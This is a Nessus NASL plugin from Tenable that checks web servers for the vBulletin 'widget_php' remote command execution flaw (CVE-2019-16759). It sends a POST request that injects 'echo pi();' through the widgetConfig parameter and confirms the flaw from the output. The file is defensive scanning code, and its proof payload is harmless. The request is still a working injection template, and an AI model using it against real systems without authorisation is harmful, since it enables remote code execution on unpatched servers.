#%NASL_MIN_LEVEL 70300
#                                                                     
# (C) Tenable Network Security, Inc.                                  
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(130168);
  script_version("1.9");
  script_set_attribute(attribute:"plugin_modification_date", value:"2023/04/25");

  script_cve_id("CVE-2019-16759");
  script_xref(name:"CISA-KNOWN-EXPLOITED", value:"2022/05/03");

  script_name(english:"vBulletin 'widget_php' Command Execution");

  script_set_attribute(attribute:"synopsis", value:
"A bulletin board system running on the remote web server has a
command execution vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of vBulletin running on the remote host is affected by an
input-validation flaw in the 'widgetConfig' parameter to the script
'ajax/render/widget_php' that allows command execution.");
  script_set_attribute(attribute:"see_also", value:"https://seclists.org/fulldisclosure/2019/Sep/31");
  script_set_attribute(attribute:"solution", value:
"Upgrade to vBulletin 5.5.4 P1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:F/RL:O/RC:C");
  script_set_attribute(attribute:"cvss_score_source", value:"CVE-2019-16759");

  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'vBulletin widgetConfig RCE');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:"CANVAS");

  script_set_attribute(attribute:"vuln_publication_date", value:"2019/09/23");
  script_set_attribute(attribute:"patch_publication_date", value:"2019/09/29");
  script_set_attribute(attribute:"plugin_publication_date", value:"2019/10/23");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:vbulletin:vbulletin");
  script_set_attribute(attribute:"thorough_tests", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2019-2023 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("vbulletin_detect.nasl");
  script_require_keys("www/vBulletin");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port    = get_http_port(default:80);
install = get_kb_item_or_exit('www/'+port+'/vBulletin');

matches = pregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!matches)
  audit(AUDIT_WEB_APP_NOT_INST, "vBulletin", port);

dir = matches[2];

if (dir !~ '/$')
  dir = dir + '/';

url = dir + 'ajax/render/widget_php';

res = http_send_recv3(
  method:'POST',
  item:url,
  data:'widgetConfig[code]=echo pi();',
  add_headers:make_array('Content-Type', 'application/x-www-form-urlencoded'),
  port:port,
  exit_on_fail:TRUE
);

if ("3.14159265358" >!< res[2])
  audit(AUDIT_WEB_APP_NOT_AFFECTED, "vBulletin", build_url(port:port,qs:dir));

pi_pos = stridx(res[2], "3.14159265358");
res_proof = substr(res[2], pi_pos - 100, pi_pos + 100);

report = get_vuln_report(
  items:http_last_sent_request(),
  port:port,
  trailer:'\n' +
          'The above request resulted in the following output :' +
          '\n\n' +
          res_proof
);

security_report_v4(port:port, extra:report, severity:SECURITY_HOLE);

